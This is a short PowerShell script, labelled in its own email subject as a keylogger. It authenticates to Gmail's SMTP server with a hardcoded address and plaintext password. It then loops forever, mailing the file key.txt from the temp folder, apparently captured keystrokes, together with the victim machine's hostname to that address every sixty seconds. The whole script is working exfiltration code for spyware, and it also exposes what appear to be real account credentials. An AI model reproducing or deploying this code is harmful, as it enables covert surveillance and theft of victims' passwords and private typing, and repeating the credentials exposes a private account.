$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('masoncpapke@gmail.com', 'Banjo12345')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'masoncpapke@gmail.com'
$ReportEmail.To.Add('masoncpapke@gmail.com')
$ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
while(1){$ReportEmail.Attachments.Add("$ENV:temp\key.txt");$SMTPInfo.Send($ReportEmail);sleep 60} 
